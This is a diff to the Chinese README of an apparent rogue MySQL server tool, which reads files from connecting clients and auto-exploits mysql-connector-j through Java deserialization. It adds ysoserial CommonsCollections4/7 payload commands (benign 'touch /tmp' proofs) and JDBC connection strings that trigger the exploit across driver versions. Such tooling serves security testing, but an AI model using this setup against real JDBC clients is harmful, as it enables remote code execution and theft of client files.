@@ -41,10 +41,12 @@ users:
 
 jdbc_exploit: false
 always_exploit: false
-ysoserial_command: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'open -a Calculator']
+ysoserial_command:
+  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
+  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
 ```
 
-`host`, `port` 对应监听的 IP 和端口. version_string 对应客户端得到的服务端版本信息.  
+`host`, `port` 对应监听的 IP 和端口. `version_string` 对应客户端得到的服务端版本信息.  
 `auth` 对应是否开启验证, 如果为 `false`, 那么不管输什么密码或者不输入密码都可以登录.  
 如果为 `true`, 则需要帐号密码匹配下面的设置的帐号密码中的一条.  
 而 `file_list` 对应需要读取的文件, 会按照客户端执行语句的顺序读取列表中的文件, 并保存到 `save_path` 文件夹中.
@@ -61,16 +63,21 @@ https://github.com/mysql/mysql-connector-j/commit/13f06c38fb68757607c460789196e3
 ```yaml
 jdbc_exploit: false
 always_exploit: false
-ysoserial_command: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'open -a Calculator']
+ysoserial_command:
+  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
+  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
 ```
-`jdbc_exploit` 代表这个功能开启, 在检测到客户端是 mysql-connector-j 的情况下会自动利用.  
-`always_exploit` 代表总是开启利用, 优先级比 `always_read` 高.  
-`ysoserial_command` 生成反序列化 payload 的命令.
+`jdbc_exploit` 代表这个功能开启, 在检测到客户端是 mysql-connector-j 的情况下会自动利用. jdbc 利用和读取文件只能同时开启一项, 开启 jdbc 利用会导致无法读取 jdbc 客户端的文件.  
+`always_exploit` 代表不检测客户端是否为 jdbc, 总是开启 jdbc 利用.  
+`ysoserial_command` 生成反序列化 payload 的命令, 使用 jdbc 的 `connectionAttributes` 选项来指定使用的 payload, 其中 cc4, cc7 对应在连接属性 `t` 中的值. 如果未指定, 则使用提供的所有 payload 中的第一个.  
+
+例如:  
+在 8.x 版本下要使用 cc7, jdbc 连接串为 `jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password`
 
 ```
-8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
-6.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
->=5.1.11: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
+8.x: jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
+6.x: jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
+>=5.1.11: jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password
 ```
 
 ## Ref
